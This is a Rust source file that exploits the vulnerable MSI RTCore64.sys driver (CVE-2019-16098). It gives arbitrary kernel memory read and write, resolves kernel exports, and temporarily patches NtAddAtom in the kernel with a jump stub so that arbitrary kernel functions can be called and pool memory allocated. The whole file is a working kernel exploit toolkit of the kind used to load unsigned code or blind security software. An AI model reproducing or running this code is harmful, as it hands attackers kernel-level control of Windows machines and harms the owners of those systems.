//! Signed-carrier layer: arbitrary kernel-VA read/write via MSI RTCore64.sys
//! (CVE-2019-16098). The driver dereferences a user-supplied pointer in its
//! own kernel context, so we read/write any mapped kernel virtual address
//! directly: no CR3, no page-table walk, no physical scan, no test signing.
//!
//! Device: \\.\RTCore64 (some builds use the \\.\Global\ aliased name).
//! Wire format (48-byte buffer, same buffer in and out):
//!
//!   +0x00 BYTE  pad0[8]
//!   +0x08 DWORD64 address   -- kernel VA to touch
//!   +0x10 BYTE  pad1[8]
//!   +0x18 DWORD read_size    -- 1, 2 or 4 bytes (driver only supports these)
//!   +0x1C DWORD value        -- read result, or write payload
//!   +0x20 BYTE  pad2[16]
//!
//! IOCTLs:
//!   0x80002048 -- read  (dereference, copy 1/2/4 bytes into value)
//!   0x8000204C -- write (dereference, store value over 1/2/4 bytes)
//!
//! SAFETY: the dereference is unguarded in the driver; a bad address
//! bugchecks the box. Every read/write here is bounded by an explicit
//! allowed window (register with `add_window`) so a garbage export RVA or
//! stale pointer can never reach the driver.

use std::io;
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, HANDLE, INVALID_HANDLE_VALUE};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileA, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
};
use windows_sys::Win32::System::IO::DeviceIoControl;

const MEM_READ:  u32 = 0x8000_2048;
const MEM_WRITE: u32 = 0x8000_204C;

#[repr(C)]
struct Buf {
    pad0:  [u8; 8],
    addr:  u64,
    pad1:  [u8; 8],
    size:  u32,
    value: u32,
    pad2:  [u8; 16],
}

pub struct Rtc {
    handle: HANDLE,
    wins:   Vec<(u64, u64)>, // (base, len)
}

unsafe impl Send for Rtc {}

impl Drop for Rtc {
    fn drop(&mut self) {
        if !self.handle.is_null() && self.handle != INVALID_HANDLE_VALUE {
            unsafe { CloseHandle(self.handle) };
        }
    }
}

type FnNtAddAtom = unsafe extern "system" fn(*const u16, u32, *mut u16) -> i32;
type FnAny4      = unsafe extern "system" fn(u64, u64, u64, u64) -> i64;

impl Rtc {
    /// Open the carrier device.
    pub fn open() -> io::Result<Self> {
        let mut last = io::Error::new(io::ErrorKind::NotFound, "RTCore64 not found");
        for name in [b"\\\\.\\RTCore64\0".as_ptr(), b"\\\\.\\Global\\RTCore64\0".as_ptr()] {
            let h = unsafe {
                CreateFileA(
                    name,
                    0x8000_0000 | 0x4000_0000, // GENERIC_READ | GENERIC_WRITE
                    FILE_SHARE_READ | FILE_SHARE_WRITE,
                    std::ptr::null(),
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL,
                    std::ptr::null_mut(),
                )
            };
            if h != INVALID_HANDLE_VALUE && !h.is_null() {
                return Ok(Rtc { handle: h, wins: Vec::new() });
            }
            last = io::Error::new(
                io::ErrorKind::NotFound,
                format!("\\\\.\\RTCore64 open failed: err {}", unsafe { GetLastError() }),
            );
        }
        Err(last)
    }

    /// Register `[base, base+len)` as readable/writable kernel space.
    pub fn add_window(&mut self, base: u64, len: u64) {
        if len > 0 {
            self.wins.push((base, len));
        }
    }

    fn in_window(&self, addr: u64, len: usize) -> bool {
        self.wins.iter().any(|&(b, l)| addr >= b && addr + len as u64 <= b + l)
    }

    /// Single 1/2/4-byte primitive read. Returns what the driver put in value.
    fn io_r(&self, addr: u64, size: u32) -> io::Result<u32> {
        let mut b = Buf { addr, size, ..unsafe { std::mem::zeroed() } };
        let mut ret = 0u32;
        let ok = unsafe {
            DeviceIoControl(
                self.handle, MEM_READ,
                &b as *const _ as *const _, std::mem::size_of::<Buf>() as u32,
                &mut b as *mut _ as *mut _, std::mem::size_of::<Buf>() as u32,
                &mut ret, std::ptr::null_mut(),
            ) != 0
        };
        if ok { Ok(b.value) } else {
            Err(io::Error::new(io::ErrorKind::Other,
                format!("RTCore64 read @0x{:X} sz={}: err {}", addr, size,
                    unsafe { GetLastError() })))
        }
    }

    /// Single 1/2/4-byte primitive write.
    fn io_w(&self, addr: u64, size: u32, value: u32) -> io::Result<()> {
        let mut b = Buf { addr, size, value, ..unsafe { std::mem::zeroed() } };
        let mut ret = 0u32;
        let ok = unsafe {
            DeviceIoControl(
                self.handle, MEM_WRITE,
                &b as *const _ as *const _, std::mem::size_of::<Buf>() as u32,
                &mut b as *mut _ as *mut _, std::mem::size_of::<Buf>() as u32,
                &mut ret, std::ptr::null_mut(),
            ) != 0
        };
        if ok { Ok(()) } else {
            Err(io::Error::new(io::ErrorKind::Other,
                format!("RTCore64 write at 0x{:X} sz={}: err {}", addr, size,
                    unsafe { GetLastError() })))
        }
    }

    /// Read `out.len()` bytes from kernel VA `addr`. 4-byte steps (driver cap).
    pub fn read_memory(&self, addr: u64, out: &mut [u8]) -> io::Result<()> {
        if out.is_empty() { return Ok(()); }
        if !self.in_window(addr, out.len()) {
            return Err(io::Error::new(io::ErrorKind::AddrNotAvailable,
                format!("read 0x{:X}+{} outside allowed windows", addr, out.len())));
        }
        let mut i = 0usize;
        while i < out.len() {
            let take = std::cmp::min(4, out.len() - i);
            let v = self.io_r(addr + i as u64, take as u32)?;
            out[i..i + take].copy_from_slice(&v.to_le_bytes()[..take]);
            i += take;
        }
        Ok(())
    }

    /// Write `data` to kernel VA `addr`. 4-byte steps (driver cap).
    pub fn write_memory(&self, addr: u64, data: &[u8]) -> io::Result<()> {
        if data.is_empty() { return Ok(()); }
        if !self.in_window(addr, data.len()) {
            return Err(io::Error::new(io::ErrorKind::AddrNotAvailable,
                format!("write 0x{:X}+{} outside allowed windows", addr, data.len())));
        }
        let mut i = 0usize;
        while i < data.len() {
            let take = std::cmp::min(4, data.len() - i);
            let mut word = [0u8; 4];
            word[..take].copy_from_slice(&data[i..i + take]);
            self.io_w(addr + i as u64, take as u32, u32::from_le_bytes(word))?;
            i += take;
        }
        Ok(())
    }

    /// Kernel RO regions are written the same way (we write the kernel VA).
    pub fn write_ro_memory(&self, addr: u64, data: &[u8]) -> io::Result<()> {
        self.write_memory(addr, data)
    }

    // ── Export resolution (binary search over the sorted name table) ───────

    pub fn get_module_export(&self, module_base: u64, fn_name: &str) -> Option<u64> {
        let mut tmp4 = [0u8; 4];
        self.read_memory(module_base + 0x3C, &mut tmp4).ok()?;
        let e_lfanew = u32::from_le_bytes(tmp4) as u64;

        let mut sig = [0u8; 4];
        self.read_memory(module_base + e_lfanew, &mut sig).ok()?;
        if &sig != b"PE\0\0" { return None; }

        let opt = module_base + e_lfanew + 24;
        let mut dd = [0u8; 8];
        self.read_memory(opt + 0x70, &mut dd).ok()?;
        let exp_rva  = u32::from_le_bytes(dd[0..4].try_into().ok()?) as u64;
        let exp_size = u32::from_le_bytes(dd[4..8].try_into().ok()?) as u64;
        if exp_rva == 0 { return None; }

        let mut dir = [0u8; 40];
        self.read_memory(module_base + exp_rva, &mut dir).ok()?;
        let num_names = u32::from_le_bytes(dir[0x18..0x1C].try_into().ok()?) as usize;
        let names_rva = u32::from_le_bytes(dir[0x20..0x24].try_into().ok()?) as u64;
        let ords_rva  = u32::from_le_bytes(dir[0x24..0x28].try_into().ok()?) as u64;
        let funcs_rva = u32::from_le_bytes(dir[0x1C..0x20].try_into().ok()?) as u64;
        if num_names == 0 { return None; }

        let mut lo = 0usize;
        let mut hi = num_names;
        while lo < hi {
            let mid = lo + (hi - lo) / 2;

            let mut b4 = [0u8; 4];
            self.read_memory(module_base + names_rva + mid as u64 * 4, &mut b4).ok()?;
            let name_rva = u32::from_le_bytes(b4) as u64;

            let mut nb = [0u8; 64];
            let _ = self.read_memory(module_base + name_rva, &mut nb);
            let end = nb.iter().position(|&b| b == 0).unwrap_or(64);
            let cand = std::str::from_utf8(&nb[..end]).ok()?;

            match cand.cmp(fn_name) {
                std::cmp::Ordering::Equal => {
                    let mut b2 = [0u8; 2];
                    self.read_memory(module_base + ords_rva + mid as u64 * 2, &mut b2).ok()?;
                    let ord = u16::from_le_bytes(b2) as u64;
                    let mut b4b = [0u8; 4];
                    self.read_memory(module_base + funcs_rva + ord * 4, &mut b4b).ok()?;
                    let fn_rva = u32::from_le_bytes(b4b) as u64;
                    if fn_rva == 0 { return None; }
                    let fn_va = module_base + fn_rva;
                    // forwarders
                    if fn_va >= module_base + exp_rva && fn_va < module_base + exp_rva + exp_size {
                        return None;
                    }
                    return Some(fn_va);
                }
                std::cmp::Ordering::Less    => lo = mid + 1,
                std::cmp::Ordering::Greater => hi = mid,
            }
        }
        None
    }

    // ── CallKernelFunction (NtAddAtom swap) ─────────────────────────────

    pub fn kernel_call(&self, ntos_base: u64, fn_addr: u64, a0: u64, a1: u64, a2: u64, a3: u64) -> io::Result<i64> {
        let ntdll = unsafe {
            let h = windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(b"ntdll.dll\0".as_ptr());
            if h.is_null() { return Err(io::Error::last_os_error()); }
            windows_sys::Win32::System::LibraryLoader::GetProcAddress(h, b"NtAddAtom\0".as_ptr())
        };
        let Some(p) = ntdll else {
            return Err(io::Error::new(io::ErrorKind::NotFound, "NtAddAtom not in ntdll"));
        };
        let nt_add_atom: FnNtAddAtom = unsafe { std::mem::transmute(p) };

        static mut KERNEL_NT_ADD_ATOM: u64 = 0;
        let kernel_naa = unsafe {
            if KERNEL_NT_ADD_ATOM == 0 {
                KERNEL_NT_ADD_ATOM = self.get_module_export(ntos_base, "NtAddAtom")
                    .ok_or_else(|| io::Error::new(io::ErrorKind::NotFound,
                        "ntoskrnl.NtAddAtom not resolved"))?;
            }
            KERNEL_NT_ADD_ATOM
        };

        // a) snapshot original 12 bytes
        let mut original = [0u8; 12];
        self.read_memory(kernel_naa, &mut original)?;
        eprintln!("[dbg] call_kernel_fn: fn=0x{:X} knaa=0x{:X} orig={:02X?}",
            fn_addr, kernel_naa, original);
        if original[0] == 0x48 && original[1] == 0xB8 && original[10] == 0xFF && original[11] == 0xE0 {
            return Err(io::Error::new(io::ErrorKind::Other,
                "NtAddAtom already patched -- concurrent call?"));
        }

        // b) MOV RAX, fn (10B) + JMP RAX (2B), write, verify, call, restore
        let mut sc = [0u8; 12];
        sc[0] = 0x48; sc[1] = 0xB8;
        sc[2..10].copy_from_slice(&fn_addr.to_le_bytes());
        sc[10] = 0xFF; sc[11] = 0xE0;
        self.write_ro_memory(kernel_naa, &sc)?;

        let mut vfy = [0u8; 12];
        let _ = self.read_memory(kernel_naa, &mut vfy);
        if vfy[0] != 0x48 || vfy[1] != 0xB8 || vfy[10] != 0xFF || vfy[11] != 0xE0 {
            let _ = self.write_ro_memory(kernel_naa, &original);
            return Err(io::Error::new(io::ErrorKind::Other,
                "NtAddAtom patch did not stick -- aborting"));
        }

        let f: FnAny4 = unsafe { std::mem::transmute(nt_add_atom) };
        let r = unsafe { f(a0, a1, a2, a3) };

        let _ = self.write_ro_memory(kernel_naa, &original);
        Ok(r)
    }

    // ── Pool allocation ──────────────────────────────────────────────────

    pub fn alloc_pool(&self, ntos_base: u64, size: u64) -> io::Result<u64> {
        let tag: u64 = u32::from_le_bytes(*b"BwtE") as u64;
        let addr = if let Some(ex2) = self.get_module_export(ntos_base, "ExAllocatePool2") {
            eprintln!("[dbg] alloc_pool: ExAllocatePool2(0x80, 0x{:X})", size);
            self.kernel_call(ntos_base, ex2, 0x80, size, tag, 0)? as u64
        } else {
            let ex = self.get_module_export(ntos_base, "ExAllocatePoolWithTag")
                .ok_or_else(|| io::Error::new(io::ErrorKind::NotFound,
                    "no ExAllocatePool2/ExAllocatePoolWithTag"))?;
            self.kernel_call(ntos_base, ex, 0, size, tag, 0)? as u64
        };
        if addr == 0 {
            return Err(io::Error::new(io::ErrorKind::OutOfMemory,
                format!("pool alloc NULL for 0x{:X}", size)));
        }
        Ok(addr)
    }

    pub fn free_pool(&self, ntos_base: u64, addr: u64) -> io::Result<()> {
        let ex = self.get_module_export(ntos_base, "ExFreePool")
            .ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "ExFreePool not found"))?;
        self.kernel_call(ntos_base, ex, addr, 0, 0, 0)?;
        Ok(())
    }
} // impl Rtc